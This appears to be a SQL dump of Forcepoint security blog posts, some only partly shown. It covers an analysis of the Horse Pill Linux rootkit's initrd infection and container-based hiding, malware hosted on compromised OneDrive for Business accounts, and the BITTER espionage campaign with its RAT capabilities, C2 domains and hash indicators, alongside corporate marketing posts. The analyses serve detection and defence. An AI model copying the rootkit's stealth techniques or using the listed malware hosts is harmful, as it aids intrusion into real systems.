INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (114, 'The Horse Pill Rootkit vs. Forcepoint Threat Protection for Linux', 'Andrew TappertJohn BergbomForcepoint Security Labs', '\n      \n    \n      \n      \n   ', 'The Horse Pill rootkit was presented at Black Hat 2016 by Michael Leibowitz, a security engineer and member of the Red Team at Intel. Horse Pill is a proof-of-concept Linux rootkit that demonstrates two interesting techniques: 1. infecting systems via the initial ramdisk, and 2. deceiving system owners using container primitives. In this article we explore those techniques and how our product, Forcepoint Threat Protection for Linux, fares against them.\n\n\n	Initrd Infection\n\n\n	The initial ramdisk, or initrd, is a compressed archive containing files needed by a Linux system early in the boot process. The initrd is loaded into memory, alongside the compressed kernel image, by the bootloader. Here is a listing of the initial ramdisk and corresponding compressed kernel image file on an Ubuntu 16.04 system:\n\n\n-rw-r--r-- 1 root root  35M Nov 10 01:05 /boot/initrd.img-4.4.0-47-generic\n-rw------- 1 root root 6.8M Oct 26 18:27 /boot/vmlinuz-4.4.0-47-generic\n\n\n	The initrd is dynamically generated on each system. You can see this by comparing the timestamps above. The kernel was created October 26, but it was not installed on this system until November 10, and that’s when the initrd was created. The reason it is dynamically created is usually so that kernel modules that are needed for a specific environment (hardware, filesystems, etc.) can be included.  Some system software updates may trigger the initrd to be rebuilt in order for updated components to be included. There will be a distinct initrd for every kernel available to the system.\n\n\n	The Ubuntu 16.04 initrd is a gzipped CPIO archive:\n\n\n/boot/initrd.img-4.4.0-47-generic: gzip compressed data, last modified: Thu Nov 10 06:05:45 2016, from Unix\n\n$ gunzip --to-stdout /boot/initrd.img-4.4.0-47-generic | file -\n/dev/stdin: ASCII cpio archive (SVR4 with no CRC)\n\n\n	Within the initrd archive we find executables, configuration files, kernel modules, firmware, shared libraries, scripts, and more.\n\n\n$ gunzip --to-stdout /boot/initrd.img-4.4.0-47-generic | cpio -tv\n-rwxr-xr-x   1 root     root          976 Apr 28  2016 bin/dmesg\n-rwxr-xr-x   1 root     root         3936 Apr 28  2016 bin/dd\n-rwxr-xr-x   1 root     root         4872 Apr 28  2016 bin/run-init\n...\n\n\n	There are over 1000 files in this initrd. At boot, the kernel runs the “init” script from the initrd, which in turn executes the “run-init” binary from the initrd to start the initial user-mode process of the system.  The “run-init” program is what Horse Pill infects. The modified run-init that Horse Pill puts in the initrd enables it to gain control of execution early in the boot process. Here’s what the initrd contents look like after infection (note the change in size and timestamp of the run-init binary):\n\n\n$ gunzip --to-stdout /boot/initrd.img-4.4.0-47-generic | cpio -tv\n-rwxr-xr-x   1 root     root          976 Apr 28  2016 bin/dmesg\n-rwxr-xr-x   1 root     root         3936 Apr 28  2016 bin/dd\n-rwxr-xr-x   1 root     root       164216 Nov 14 12:13 bin/run-init\n...\n\n\n	The Horse Pill rootkit replaces one file in the initrd, and thereby gains control over the system at boot time. Because the initrd is dynamically generated, and there are no integrity checks on it, it is unlikely that such a change will be noticed through casual observation.\n\n\n	Container-based Deception\n\n\n	When the Horse Pill rootkit gains execution via the initrd infection described above, it places the whole system into a newly created container (strictly speaking, “set of Linux kernel namespaces”). Let’s call that the “contained system”. It also launches a backdoor process, outside that container. Everything else on the system, including the systemd init process, and all the regularly expected system services and applications, are running inside the contained system.  Horse Pill’s run-init process also creates processes and renames them to appear to be kernel threads. The users and administrators who are “victims” of the rootkit can’t see the rootkit and backdoor processes running outside the contained system. The system appears pretty much normal from within it.\n\n\n	The remote network access backdoor used by the Horse Pill rootkit is a tool called dnscat2. To interact with the victim system, we run a dnscat2 server on another system. Via the dnscat2 server we can get a shell on the victim system which is running outside the contained system. Here’s a comparison of the view from within and without.\n\n\n	 is used for processes that make up the contained system, which is a process tree (corresponding to the contained system’s PID namespace) rooted at the systemd init process that is PID 1 within the contained system and PID 192 in the host environment.\n\n\n	 is used for fake kernel threads.\n\n\n	 is used for real kernel threads.\n\n\n	 is used for rootkit and backdoor processes.\n\n\n	From INSIDE the contained system, with the pstree command one sees all the processes and services running in the contained system, plus somewhat-realistic-looking (but actually fake) kernel threads:\n\n\n	\n\n\n	From OUTSIDE (i.e. in a shell obtained via the dnscat2 server), one sees rootkit and backdoor process, the contained system, and the fake kernel threads:\n\n\n	\n\n\n	But guess what… pstree does not normally list kernel threads!  On a normal, uninfected system one would not see kernel threads with pstree as we do in both the inside and outside views above.\n\n\n	With the ps command, from INSIDE one sees the contained system and somewhat-realistic-looking fake kernel threads:\n\n\n	\n\n\n	From OUTSIDE with ps one sees real kernel threads, fake kernel threads, rootkit and backdoor processes, and the contained system:\n\n\n	\n\n\n	Container technology hides the remote access backdoor (the dnscat process and its children) from users and processes within the contained system. In the “PID namespace” of the container, the systemd init process appears as PID 1, as normal, whereas in fact Horse Pill’s modified run-init is the actual PID 1 of the system and system init has PID 192. The backdoor process, because it is not part of the contained system’s PID namespace, is not visible there.\n\n\n	To attempt to maintain the illusion of normality, Horse Pill presents kernel threads inside the container, using a more old-fashioned kind of deception: process renaming.  The fake kernel threads are actually user-mode processes, set up to appear like kernel threads. This deception is inevitably imperfect. Aside from unexpectedly appearing in pstree output as mentioned above, note the “VSZ” and “RSS” (virtual and physical memory usage) of PID 2 (the kthreadd kernel thread) in the inside and outside views. In the inside view, where PID 2 is a fake kernel thread, these are non-zero.  Real kernel threads always have zero VSZ and RSS, since real kernel threads don’t have an “mm_struct” that defines the virtual address space for a user-mode process.\n\n\n	Would Horse Pill be better off not trying to fake the kernel threads? Is it more likely that someone would notice them missing, or that someone would notice that they don’t look quite right? Or is there some other better way to get them to appear normal-looking from within the contained system? Or is it just the right amount of stealth and deception in the absence of automated detection capabilities?\n\n\n	Aside from the anomalies one may notice regarding the faked kernel threads, as we have illustrated above, other avenues for detection of Horse Pill are discussed in the Black Hat presentation, including checking ns (“namespace”) links in the proc filesystem, and via the Linux audit subsystem.\n\n\n	Horse Pill vs. Forcepoint Threat Protection for Linux\n\n\n	Forcepoint Threat Protection for Linux (Second Look) is a security product that performs enterprise-scale Linux memory forensics. It checks the integrity of the running kernel, processes, and executable code cached in memory on Linux systems. It alerts users to rootkits, malware, and other unknown or unauthorized software in memory. Due to its integrity-based approach, it is not reliant on signatures or prior knowledge of specific threats. And due to being based on memory forensics, it gets what is essentially the “outside” perspective discussed above: it can see both the contained system and the rootkit and backdoor processes in memory.\n\n\n	When analyzing a system infected with the Horse Pill rootkit, we produce four different types of alerts: kernel_thread_masquerade, unlinked_executable, unverified_elf, and unverified_executable_mapping. All four alert types are visible in the screenshot below, of a “task details” page from the product’s web interface. It is perhaps worth noting that all this alerting was produced even with versions of the product that were available prior to release of the Horse Pill rootkit – we didn’t need to make any additions or adjustments to the product in order to detect even this novel rootkit, as shown here.\n\n\n	\n\n\n	The kernel_thread_masquerade alert is produced when we detect a user-mode process that may be attempting to pretend to be a kernel thread. This is a technique long used by attackers to attempt to blend in on Linux systems, under the assumption that most administrators glance right over any kernel threads, whose names appear in square brackets in ps output. For example, the “mimic” tool for covert execution on Linux uses a default of “[kworker/0:0]” to hide root processes (see https://github.com/emptymonkey/mimic).\n\n\n	The unlinked_executable alert is produced when a process is running from a deleted executable file. This is most often an indication that a program has been updated (overwritten with a new version), while the old version remains running.  But it can also be caused by an attacker removing a tool after he runs it. In this case, the alert is produced because this process is running from a binary in the initrd, which is no longer accessible now that the system has booted. \n\n\n	The unverified_elf alert is produced when the product detects an ELF binary (executable or shared object) cached in memory, that is not known to it (i.e. one that is not present in the reference data set that the product uses to verify code in memory). In this case, the ELF in question is the one the Horse Pill rootkit injected into the initrd. That is of course not present in the cloud-hosted reference data repository that tracks stock software from Linux distribution vendor packages, nor should it be in any user’s reference data for custom and third-party software deployed in their environment.\n\n\n	Finally, the unverified_executable_mapping alert is produced when an unverified ELF is found mapped into the address space of a running process. In this case that is particularly alerting because this process is ostensibly a kernel thread and would therefore not be expected to have any mappings of its own.\n\n\n	Not only do we alert on Horse Pill’s fake kernel threads, but also on the rootkit and backdoor processes. For example, below we show the “cached file details” page for the dnscat binary that was embedded as a payload in the infected binary in the initrd.\n\n\n	\n\n\n	Blog contributors: Andrew Tappert, Tom O\'Connor\n\n\n	 \n\n\n	References\n\n\n	Links to more information on the Horse Pill rootkit:\n\n\n	Project web site: http://www.pill.horse/\n\n\n	Project code on Github: https://github.com/r00tkillah/HORSEPILL\n\n\n	Black Hat conference presentation (PDF): https://www.blackhat.com/docs/us-16/materials/us-16-Leibowitz-Horse-Pill-A-New-Type-Of-Linux-Rootkit.pdf\n\n\n	Black Hat conference presentation (video): https://www.youtube.com/watch?v=wgbwmjtxZ5I', 'https://www.forcepoint.com/blog/security-labs/horse-pill-rootkit-vs-forcepoint-threat-protection-linux\n');

The trojan collected Microsoft Word and Excel files from affected PCs, archived them, and then uploaded the archive to the file hosting website, SendSpace, so that it can be later accessed by the cybercriminals behind it. Fast forward to today, and the same abuse has become a de facto standard for many cybercriminals, perhaps primarily for spreading malware. Free cloud-storage services are used to host malware where the generated download links are sent to prospective victims as part of social engineering lure.\n\n\n	In a recent shift in this tactic, Forcepoint Security Labs™ have observed that cybercriminals have started to utilize compromised OneDrive for Business accounts for hosting malware since at least August of this year. One Drive for Business is a paid Microsoft service for businesses where employees can store and share files. Each registered employee has a personal URL called \"MySite\" where work-related files can be uploaded and shared, even to external parties. The following shows the format of a MySite URL:\n\n\n	https://{business domain name}-my.sharepoint.com/personal/{employee user name}_{business domain name}/\n\n\n	These employee MySite accounts are being compromised and used to upload malware. The generated download links are then included in mass-mailing campaigns. Below is an example of a malicious email containing a OneDrive for Business\' MySite download link:\n\n\n	\n\n\n	Clicking the link then leads to a download prompt. As of this writing, we are seeing multiple malware families that are being distributed using this method including Dridex and Ursnif. \n\n\n	The hosted malware is either an executable file or an archive file containing a JavaScript downloader. In some cases, the JavaScript downloader downloaded malware from another OneDrive for Business link.\n\n\n	Based on our telemetry, below are the top 7 email subjects containing malicious OneDrive for Business links for the past 90 days:\n\n\n	\n\n\n	The above emails were predominantly sent to recipients from Australia, followed by the United Kingdom:\n\n\n	\n\n\n	The following chart shows the monthly hit counts for these emails for the past 90 days:\n\n\n	\n\n\n	Protection Statement\n\n\n	Forcepoint™ customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\n\n	Stage 2 (Lure) - Malicious e-mails are identified and blocked\n	Stage 5 (Dropper File) - Malicious payloads are prevented from being downloaded to the target machine.\n	Stage 6 (Call Home) - Communication between the downloaded malware and command and control are blocked.\n\n\n	Conclusion\n\n\n	The abuse of online cloud storage services are a cost effective and highly disposable approach for cybercriminals to spread malware. However, as this tactic already known to many people nowadays, cybercriminals may be looking for alternative ways to keep their social engineering ploys effective. The abuse of Microsoft OneDrive for Business service may aid them in this case. Since it is a known service for businesses, malicious download links hosted by such platform adds a layer of \"trust\" to prospective victims when downloading an unknown file.\n\n\n	While it is unknown how OneDrive for Business accounts are being compromised, it entails additional risk not only for the compromised user but also for the affected business as it means that the attackers may also have access to other business assets and contacts. In addition, as explained above, the URL format of OneDrive for Business download links contain the business domain name of a compromised user. This can consequently tarnish the reputation of a business.\n\n\n	Businesses that utilize third-party business solutions such as OneDrive for Business are advised to put additional focus on the security of the related user accounts to prevent such risks. Equally, users should be vigilant when downloading files from OneDrive for Business (Sharepoint) links coming from an unsolicited email.', 'https://www.forcepoint.com/blog/security-labs/compromised-microsoft-onedrive-business-accounts-used-spread-malware\n');

It helps me do a better job for our customers.”\n\n\n	“And when it comes to raw technology – it’s important to mention the work done by all the teams involved in the DARPA Cyber Grand Challenge. We supported team Deep Red in this contest – but all the teams involved help push the science of autonomous cyber defense forward dramatically. The new techniques developed to compete will be driving product innovation for years to come.”\n\n\n	Bob Hansmann, Director of Security Technologies:\n\n\n	“After this year, I’m grateful for the advancements in threat analytics. Innovations have improved real-time identification of the most advanced threats from malware to initial phishing emails. This has helped render many cutting-edge evasion techniques developed by cybercriminals useless.”\n\n\n	“It’s also important to highlight expanding collaboration among security solutions.  Modern cyber defense strategies involve dozens of products applied in concert, but functioning independently.  As SaaS defenses, firewalls, DLP, UBA and other solutions begin to communicate automatically, they improve the identification of new threats.\n\n\n	“Most importantly, I’m thankful that people have finally started to ask for evidence that their data is being appropriately secured when stored in or processed by 3rd-party cloud service providers. After several high-profile breaches of cloud services, I think people now realize how easily they could become collateral damage in an attack, even if it targets another user of a service. Organizations are asking for assurances that cloud facilities are properly secured both physically and digitally. More than anything, it’s critical that Security-as-a-Service providers lead the way, which makes me also grateful that Forcepoint had the foresight to invest in ISO, CSTAR, and other important certifications years ago.”\n\n\n	With our eyes on the horizon and everything in store for the cyber industry in 2017, the Forcepoint team wishes you a happy, healthy and safe Thanksgiving.

Ed was joined on stage by moderator Mark Frantz, Co-Founder of Blue Delta Capital Partners and fellow panelists Anup Ghosh, CEO of Invincea and Jack Huffard, President, COO and Co-Founder of Tenable Network Security.\n\n\n	Introducing Ed, Mark remarked that Forcepoint was “the most dynamic and compelling cybersecurity story we’ve seen in a while” and Ed agreed that Forcepoint’s origins in the combination of Raytheon Cyber Products with Stonesoft and Websense was a perfect example of bringing innovations forged in the service of government and commercial organizations together.\n\n\n	With so many cybersecurity-related companies and issues coming to market, panelists agreed that the greater Washington, D.C. region is an ideal place to situate a security company’s headquarters or strategic offices. The panel noted that as cybersecurity concerns and incidents become more mainstream – a staple of daily news, pop culture and our personal lives – the Washington area’s communities of legal, policy, industry association and other groups are a tremendous networking and advocacy resource for security experts looking to raise awareness and inform important decisions.\n\n\n	“Dispelling myths” was another prime focus of the discussion. While some audience members suggested the Washington region is still typecast as a “government town” with more cybersecurity “laggards” than cutting edge innovators, the panelists explained how they have seen this inaccurate perception change over their respective careers.\n\n\n	﻿Ed noted that Washington is the epicenter of some of the most important, transformational research in cybersecurity, through organizations like DARPA and others. He pointed out that as a result of so many sharp security minds in the government, there are numerous examples of outstanding ﻿cybersecurity progress and innovation within federal agencies. The challenge for federal officials, Ed explained, is that the massive size and growing interconnected nature of the government means security progress must scale rapidly – which can be challenging in any large organization, public or private.\n\n\n	When Mark asked whether security start-ups should try to sell into government or commercial organizations, first, the panelists offered a lot of valuable, practical insight gained over decades of experience in building and growing companies. Security entrepreneurs tend to want to sell products immediately, developed exactly as their inventors conceived them, panelists explained. On the other hand, large organizations in government, financial services, healthcare – or anywhere – are generally hesitant to quickly deploy a new invention with a short or nonexistent track record, meaning start-ups’ earliest sales to large enterprises are likely to testing environments.\n\n\n	The panel recommended the region’s security businesses capitalize on advantages the area gives them and seek out prospective customers who are motivated to try new approaches in cybersecurity due to unique size, budget, mission or other factors. “Unconventional, start-up thinking” also exists on the buyer side, they explained, and fledgling security companies able to find that mentality in professionals across industry and government can build strong networks that reliably open doors for new ideas.\n\n\n	Where do you think the government and private sector can best lead by example in cybersecurity?

His panel entitled Millennial Rising - Do Cracks in the Government’s Generation Dam Signal a Cybersecurity Tsunami, was the result of a Forcepoint commissioned study to specifically identify millennial patterns and behaviors as they relate to the use of technology in the workplace and beyond.\n\n\n	The diverse expert panel headed up by AP tech reporter, Bree Fowler, and in addition to Ed featured Jeff Six of T.Rowe Price, Hamilton Turner, token millennial from OptioLabs, and Lisa Dorr, workforce development expert at the Department of HHS. The panel discussed the challenges and opportunities associated with the most technically advanced and connected generation and how their day-to-day online and device practices and behaviors may impact their employer’s security posture.\n\n\n	While there is always room for debate during these types of discussions, the one thing the panelists quickly agreed upon was that millennials are constantly connected and technically savvy. This fact presents both risk and opportunity. The opportunity lies in the fact that millennials understand technology better than their predecessors and if trained adequately can actually be a benefit rather than a risk. To account for their potentially risky technology practices, organizations must build a complete security program that combines technologies, processes and training.\n\n\n	Time is of the essence to find a suitable balance between millennials and security, as millennials are projected to account for 75 percent of the workforce by 2025. Risky behaviors such as regular use of unprotected public Wi-Fi and sharing of passwords, combined with a belief that cybersecurity is solely the IT department’s responsibility, presents some very urgent security challenges for government. If left unchecked, the potential for significant breaches in the future will be greater than we have ever seen.\n\n\n	Millennials are a great resource and need to be properly understood if they are to remain an asset and not a security liability.

At Forcepoint™, we firmly believe that the future is now, with network segmentation leading the way.\n\n\n	Simply stated, network segmentation is described as the act of physically separating computer networks, so that each network is visible only to users who have the appropriate access rights and is not visible to unauthorized users. In stark contrast to their experiences with easy-to-penetrate flat networks, adversaries who compromise segmented enterprises find themselves running into a series of “locked doors” that present increasingly more secure barriers, with the most sensitive and/or valuable data benefiting from the most vigilant defense tools. This doesn’t disrupt business operations either; when multi-level, cross domain and virtual desktop infrastructure solutions are used, authorized users can work with role-relevant information and securely transfer data as their job requires.\n\n\n	The approach is gaining ground, but more so as a concept than a practice: three-quarters of IT professionals strongly agree that end-to-end segmentation has emerged as an essential security measure, according to recent survey research from VeraQuest. Only 23 percent, however, said their organization is actually implementing end-to-end segmentation.\n\n\n	What’s stopping them? More than one-third of IT professionals feel that network segmentation is too complex, while 29 percent said they don’t have the resources to implement it. Meanwhile, 22 percent of survey respondents said they didn’t realize that network segmentation was possible.\n\n\n	The latter finding surprises us the most: not only is network segmentation possible – it is happening. We should know, because Forcepoint has worked closely with members of the Department of Defense (DoD) and the Intelligence Community (IC), as well as those managing critical infrastructures, to adopt it. We are helping them physically separate networks and data without disrupting user productivity. As a result, private companies within industries such as finance, retail, manufacturing, healthcare, education, etc. do not have to “reinvent the wheel” to take advantage of ongoing innovations in segmentation. The solutions already exist. They are available – right now. They are also accredited, widely deployed and proven at the highest levels of DoD, IC and Civilian agencies.\n\n\n	Network segmentation once amounted to an onerous task. The need for separate physical endpoints to access separate networks required a significant amount of hardware and maintenance overhead. In addition, users found it burdensome.\n\n\n	Fortunately for our customers, this is no longer the case. Thanks to continuing advancements in virtualization and secure redisplay technologies, cross domain solutions eliminate the heavy lifting here. Our cross domain solutions allow for the secure simultaneous access to multiple networks from a single endpoint, for example, if a user is authorized to access 5 networks, without a cross domain access solution in place 5 separate endpoint devices are required; with a cross domain solution in use only one endpoint device is needed. Users of different clearances can immediately and safely retrieve and share documents, videos and other files between networks, with seamless integration from a single endpoint. Their agencies no longer need to acquire multiple machines or switching mechanisms to permit users from a wide range of clearances to access information and securely collaborate.\n\n\n	The National Institute of Standards and Technology’s Commission on Enhancing National Cybersecurity recently issued a Request for Information (RFI) in the interest of bolstering a partnership between the public and commercial sectors, to encourage the development and adoption of emerging cybersecurity innovations for governments, critical infrastructures and private companies. Upon reviewing this RFI, our government team was quick to respond on the topic area of Critical Infrastructure Cybersecurity. It was an excellent opportunity to demonstrate that Forcepoint is already forging such a partnership, by showing how we are helping our customers implement network segmentation today and that it isn’t some kind of ideal or unobtainable concept. In fact, network segmentation should become a security best practice.\n\n\n	It is a reality – and a badly needed one in an age when every organization should expect to suffer from a cyber attack. By effectively separating networks, and the data that resides on those networks, you dramatically reduce the potential for damage. Hackers will find themselves confined to one place without the freedom to roam unencumbered like they do in flat networks. The future is, indeed, now and if you’re not investing in these solutions, you’ll risk getting left behind.', 'https://www.forcepoint.com/blog/insights/segmentation-next-frontier-cybersecurity\n');
INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (121, 'Privacy Concerns for Employees – and Their Organizations', 'Sean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'Last month, Yahoo announced that hackers had stolen personal information linked to at least 500 million user accounts. The compromised information included login names, hashed passwords, email addresses, phone numbers and birth dates, along with secret security questions and answers. The breach originally occurred sometime in 2014, but the company did not disclose until the September 2016 announcement. Given that Verizon is currently in the process of acquiring Yahoo for $4.83 billion, the breach is stirring new questions about cybersecurity in M&A and the adequacy of current disclosure rules.\n\n\n	This high-profile incident demonstrates how breaches like this can create unforeseen situations for all enterprises and their employees. For many individuals, their Yahoo accounts had been unused for many years and yet the email addresses, passwords, phone numbers and secret Q&As associated are still valid and used across a series of other personal accounts, and even potentially in the enterprise. As the line continues to blur between the personal and business-intended usage of devices, applications and websites, organizations can jeopardize their security posture if their employees do not proactively follow vigilant steps to protect their data and privacy.\n\n\n	As we seek to educate readers in this space with National Cyber Security Awareness Month underway, let’s break this down into two takeaways:\n\n\n	Your employees are likely connected to Yahoo – in some manner. Even if they do not have a Yahoo email account, they may have had one in the past. What’s more, it’s conceivable that they’re taking advantage of other Yahoo-associated online products, such as Yahoo Finance, Flickr, Tumblr or its popular fantasy football platform – which creates a Yahoo-linked account. Much of the information shared and added to the account detail remains, regardless of whether or not use of that particular service/account is discontinued. If employees are setting up Yahoo accounts on devices that they also depend upon to connect to the organization’s network, it could impact your cyber defense capabilities. Especially because…\n\n\n	…hackers find a lot of information in these accounts valuable. Where to begin? There is the aforementioned personal information – phone numbers, passwords, birth dates, as well as a wealth of additional details – stored there. Banks will send links to users to direct them to monthly checking account and credit card statements, for example. Additionally, employees may have used their Yahoo email to send their resumes to your HR department when they were looking for their current role. An adversary can cause harm by leveraging the information to pose as a current employee to ultimately gain entry to payroll systems and other sources of confidential data. A compromised email account can also be used to send malicious links and attachments to other employees via their work and even personal email accounts. Using a compromised account will typically bypass common anti-spoofing controls. This can cause significant and widespread issues, as illustrated by the number of accounts impacted by the Yahoo breach.\n\n\n	Often with login information, the adversary can gain “keys to the kingdom” access to many other sites that employees join, such as PayPal, Amazon, etc. Or they can attempt to access your corporate network using the same credentials, or slight variations of them. The theft of secret questions and answers data also poses a risk to organizations that use single-sign-on technologies and automated password reset tools whereby the secret challenge is used to verify the identity of the individual. How does this relate to the Yahoo incident? Unfortunately, people still rely upon the same logins and passwords for different sites and networks, despite the risks. Combining this access with the corporate intelligence they’ve gathered, adversaries can make purchases via these sites and charge them to your business. Thanks to automated tools which are readily available on the black market, cyber criminals can rapidly match thousands of accounts to the PayPals, Amazons and corporate networks of the world to go on a massive shopping spree – at your expense.\n\n\n	The good news? Employee awareness matters. It’s critical to set up educational programs so everyone understands the need to establish different passwords for different accounts. But it doesn’t stop there. Employees must also change them on a routine basis. This way, the damage of a breach is limited to the site that was compromised – not every site that victims use during the week.\n\n\n	At Forcepoint, we’re constantly helping enterprise customers launch awareness programs that cover these and other crucial topics. In addition, we provide cybersecurity tools – which enable network segmentation and the monitoring/mitigation of both accidental and intentional insider threats – that are proven to effectively combat modern attack methods.

We named the attack \"BITTER\" based on the network communication header used by the latest variant of remote access tool (RAT) used:\n\n\n	\n\n\n	Our investigation indicates that the campaign has existed since at least November 2013 but has remained active until today. This post intends to share the results of our research.\n\n\n	Infection Vector\n\n\n	Spear-phishing emails are used to target prospective BITTER victims. The campaign predominantly used the older, relatively popular Microsoft Office exploit, CVE-2012-0158, in order to download and execute a RAT binary from a website. Below is an example of a spear-phishing email they used earlier this month. The recipient is an individual from a government branch in Pakistan, while the sender purports to be coming from another government branch of Pakistan:\n\n\n	\n\n\n	Other attachment filenames they used that also contained the CVE-2012-0158 exploit are as follows:\n\n\n		Requirement List.doc\n\n		Cyber Espionage Prevention.doc\n\n		New email guidelines.doc\n\n		Gazala-ke-haseen-nagme.doc\n\n		Rules.xls\n\n	In one instance, they used a RAR SFX dropper that drops both their RAT and a picture of a Pakistani woman as a decoy. A quick Google image search on the dropped picture indicates that the picture was grabbed from Pakistani dating sites.\n\n\n	RAT Component\n\n\n	BITTER used RATs that are compiled using Microsoft Visual C++ 8.0. They use a few iterations of their RAT with the main difference being the RAT\'s command and control (C2) communication method. Earlier variants communicated to its C2 via an unencrypted HTTP POST. Below is an example of an older variant\'s phone home request:\n\n\n	\n\n\n	Newer ones, on the other hand, use encrypted TCP connection such as the one shown in the introduction above. Both older and newer variants are used simultaneously today in the campaign.\n\n\n	The RAT version (SHA1 d7a770233848f42c5e1d5f4b88472f7cb12d5f3d) that they used in their latest campaign is capable of executing the following backdoor capabilities, essentially allowing the attackers to gain full remote control over a victim\'s PC:\n\n\n		Get system information - computer name, current user name, and operating system\n\n		Enumerate logical drives\n\n		Enumerate and log files and their corresponding timestamps\n\n		Open a remote command shell\n\n		List processes with active UDP connections\n\n		Manipulate running processes\n\n		Manipulate files\n\n		Download a file\n\n	In addition, the vast majority of their RAT binaries contained the following digital signature with a non-trusted CA Root certificate:\n\n\n	\n\n\n	The following table shows the timeline of appearance of BITTER RATs, based on their compilation timestamps, along with their embedded PDB paths:\n\n\n	\n\n\n	It is important to note that some of these RATs are distributed at a later time than their compilation date.\n\n\n	Command and Control\n\n\n	BITTER used free dynamic DNS (DDNS) and dedicated server hosting services in order to set up their C2s. The download site where the exploit documents download the RAT binaries are, in most cases, different from the actual RAT C2. However, both of them are typically registered using a Gmail email address and a spoofed identity purporting to be either from United Kingdom or Great Britain. Below is an example of a spoofed registrant information for the C2, spiralbook71[.]com:\n\n\n	\n\n\n	A list of all related malicious domains we managed to collect are as follows:\n\n\n	\n\n\n	The email address witribehelp@gmail.com​ points to an empty Google Plus profile with the name \"WhatsApp Support\". Interestingly, however, the account is connected to another Google Plus account with the handle \"Love Pakistan\":  \n\n\n	\n\n\n	Intent\n\n\n	While cyber-espionage is a common motivation for targeted attacks, this is often hard to conclude unless a forensic investigation is conducted on the actual victims\' machines. In some cases, specific capabilities in RATs provides us with clues on what the attackers\' true intents are.\n\n\n	One of the backdoor capabilities mentioned above is the logging of files and files\' time stamps from the victim\'s machine. Furthermore, an older variant of their RAT from 2014 that has the SHA1 3ab4ce4b3a44c96d6c454efcece774b33335dda2 are found to look for more specific file types. After identifying the logical drives from a victim PC, this RAT variant proceeds to enumerate files and check if they match any of the hard coded document and archive file extensions below:\n\n\n	\n\n\n	While it is hard to conclude based only on these artifacts, the nature of these targeted file types suggests that the attackers may be after sensitive documents.\n\n\n	Other Tools Used\n\n\n	In December 2015 one of the campaign\'s download sites hosted a binary at scholars90[.]website/putty. The downloaded file is a free SSH and Telnet client application called \"PuTTY\", which has been used in the past in other targeted attacks.\n\n\n	In addition, the same RAT variant previously mentioned (SHA1 3ab4ce4b3a44c96d6c454efcece774b33335dda2) connects to the C2 info2t[.]com/m2s.php​. This has also served as a C2 for at least two AndroRAT variants in the past. The following diagram shows these relationships:\n\n\n	\n\n\n	AndroRAT is an open source remote administration tool for Android. Its GitHub repository lists the following capabilities:\n\n\n		Get contacts (and all theirs informations)\n\n		Get call logs\n\n		Get all messages\n\n		Location by GPS/Network\n\n		Monitoring received messages in live\n\n		Monitoring phone state in live (call received, call sent, call missed..)\n\n		Take a picture from the camera\n\n		Stream sound from microphone (or other sources..)\n\n		Streaming video (for activity based client only)\n\n		Do a toast\n\n		Send a text message\n\n		Give call\n\n		Open an URL in the default browser\n\n		Do vibrate the phone\n\n	The AndroRAT variant with SHA1 7d47ae3114f08ecf7fb473b7f5571d70cf2556da disguises itself as the Islam Adhan Alarm - an Android app that alerts to prayer times of Islam, which is the state religion of Pakistan. The variant with SHA1 645a6e53116f1fd7ece91549172480c0c78df0f, on the other hand, disguises itself as Kashmir News app. Kashmir is the northernmost geographical region of South Asia and is a disputed territory between India and Pakistan.\n\n\n	Protection Statement\n\n\n		Stage 2 (Lure) - Spear-phishing e-mails associated with this attack are identified and blocked.\n\n		Stage 5 (Dropper File) - Related RATs are prevented from being downloaded.\n\n		Stage 6 (Call Home) - Communication between the RAT and command and control are blocked.\n\n	Conclusion\n\n\n	Many targeted attacks continue to be discovered today. It is interesting to see that while these attacks are not always sophisticated in nature, the same characteristic allows them to stay under the radar by blending in with common attacks in the wild. BITTER is able to achieve this by using available online services such as free DDNS, dedicated server hosting and Gmail to setup their C2s. Such setup is exhibited by today\'s common malware.\n\n\n	It is worth noting that in all the artifacts collected in this research, none of the English words that were used had spelling errors, suggesting that the actors behind BITTER are proficient in the English language. Furthermore, as discussed above, all the artifacts we have seen are consistent with Pakistan being the target of this group. There may be other targets that have not been discovered yet or BITTER may be a branch of a larger campaign with broader targets, but only time will tell whether any of these are correct.\n\n\n	Indicators of Compromise\n\n\n	RAT (SHA1)\n\n\n42cdfe465ed996c546c215a8e994a82fea7dc24c\n3ab4ce4b3a44c96d6c454efcece774b33335dda2\n1990fa48702c52688ce6da05b714a1b3e634db76\n93e98e9c4cf7964ea4e7a559cdd2720afb26f7f7\nc3a39dc22991fcf2455b8b6b479eda3009d6d0fd\n37e59c1b32684cedb341584387ab75990749bde7\n52485ae219d64daad6380abdc5f48678d2fbdb54\n137a7dc1c33dc04e4f00714c074f35c520f7bb97\ne57c88b302d39f4b1da33c6b781557fed5b8cece\n0172526faf5d0c72122febd2fb96e2a01ef0eff8\ne7e0ba30878de73597a51637f52e20dc94ae671d\nfa8c800224786bab5a436b46acd2c223edda230e\nc75b46b50b78e25e09485556acd2e9862dce3890\n72fa5250069639b6ac4f3477b85f59a24c603723\nf898794563fa2ae31218e0bb8670e08b246979c9\n2b873878b4cfbe0aeab32aff8890b2e6ceed1804\nd7a770233848f42c5e1d5f4b88472f7cb12d5f3d\nddf5bb366c810e4d524833dcd219599380c86e7a\n23b28275887c7757fa1d024df3bd7484753bba37\n6caae6853d88fc35cc150e1793fef5420ff311c6\n1a2ec73fa90d800056516a8bdb0cc4da76f82ade\nff73d3c649703f11d095bb92c956fe52c1bf5589\n\n\n	RAT Dropper (SHA1)\n\n\nc0fcf4fcfd024467aed379b07166f2f7c86c3200\n0116b053d8ed6d864f83351f306876c47ad1e227\n4be6e7e7fb651c51181949cc1a2d20f61708371a\n998d401edba7a9509546511981f8cd4bff5bc098\n21ef1f7df01a568014a92c1f8b41c33d7b62cb40\nc77b8de689caee312a29d30094be72b18eca778d\n\n\n	AndroRAT (SHA1)\n\n\n7d47ae3114f08ecf7fb473b7f5571d70cf2556da\n645a6e53116f1fd7ece91549172480c0c78df0f\n\n\n	RAT download sites\n\n\nkart90.website/sysdll 